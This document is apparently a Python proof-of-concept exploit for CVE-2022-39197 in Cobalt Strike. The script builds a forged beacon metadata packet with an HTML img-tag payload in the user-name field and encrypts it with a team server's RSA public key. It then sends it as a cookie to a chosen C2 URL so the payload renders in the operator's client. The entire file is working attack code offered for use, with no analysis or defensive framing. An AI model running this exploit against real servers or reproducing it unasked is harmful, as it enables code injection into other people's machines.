#!/usr/bin/env python
# coding=utf-8
import rsa
import random
import base64
import urllib.request
import argparse

def ascii_art(str):
    return str.replace(' ', '&nbsp;').replace('\\', '\\\\').replace('_', '\\_').replace('|', '\\|').replace('\n', ' \n')

title = '''\033[1;32m

   _______      ________    ___   ___ ___  ___       ____   ___  __  ___ ______   _____   ____   _____
  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \     |___ \ / _ \/_ |/ _ \____  | |  __ \ / __ \ / ____|
 | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____ __) | (_) || | (_) |  / /  | |__) | |  | | |
 | |      \ \/ / |  __|______/ /| | | |/ /  / /______|__ < \__, || |\__, | / /   |  ___/| |  | | |
 | |____   \  /  | |____    / /_| |_| / /_ / /_      ___) |  / / | |  / / / /    | |    | |__| | |____
  \_____|   \/   |______|  |____|\___/____|____|    |____/  /_/  |_| /_/ /_/     |_|     \____/ \_____|
 
 
						\033[1;36mVersion:0.1
						\033[1;36mAuthor:xzajyjs
						\033[1;36mGithub:https://github.com/xzajyjs/CVE-2022-39197-POC\033[0m
'''
# title = ascii_art(title)
print(title)
parser = argparse.ArgumentParser()
parser.add_argument('-i','--img',help='Img url.',required=True)
parser.add_argument('-u','--url',help='C2Server.',required=True)
parser.add_argument('-k','--key',help='PUBLIC KEY path.',required=True)
arg = parser.parse_args()

#pack = b'\x00\x00\xBE\xEF'  # pack head
#pack += b'\x00\x00\x00\x4C'  # pack len
pack = bytearray(random.getrandbits(4) for _ in range(16))  # AESKEY
pack += b'\xa8\x03'  # name charset  (int) (little)
pack += b'\xa8\x03'  # name charset  (int) (little)
# pack += b'\x00\x00\x00\x06' # Beacon Id random
pack += random.randint(0 , 9999999) .to_bytes(4, 'big') # Beacon Id
pack += random.randint(0 , 65535) .to_bytes(4, 'big') # Beacon Pid
pack += b'\x00\x00'  # Beacon Port
pack += b'\x04'  # Beacon Flag 04
pack += b'\x06'
pack += b'\x02'
pack += b'\x23\xf0\x00\x00\x00\x00'  # windows version (int)
pack += b'\x76\x91'  # windows version_1 (int)
pack += b'\x0a\x60\x76\x90\xf5\x50'
pack += bytearray(random.getrandbits(4) for _ in range(4))  # Beacon Ip

pack += b'\x4b\x4b'+b'\x09'+b'<html><img src='+bytes(str(arg.img),'utf-8')+b'>'+b'\x09'+b'\x61' # PAYLOAD LOAD A IMAGE
pack = b'\x00\x00\xBE\xEF'+len(pack).to_bytes(4, 'big')+pack
url = str(arg.url) # CobaltStrikeParser C2Server

with open(str(arg.key), "r", encoding='utf-8') as f:
    _pubkey = f.read().strip()

pubkey = rsa.PublicKey.load_pkcs1_openssl_pem("""
-----BEGIN PUBLIC KEY-----
{}
-----END PUBLIC KEY-----
""".format(_pubkey))
enpack = rsa.encrypt(pack, pubkey)
header = {'Cookie': base64.b64encode(enpack).decode('utf-8')}
request = urllib.request.Request(url, headers=header)
reponse = urllib.request.urlopen(request).read()
# print(hexdump.hexdump(pack))
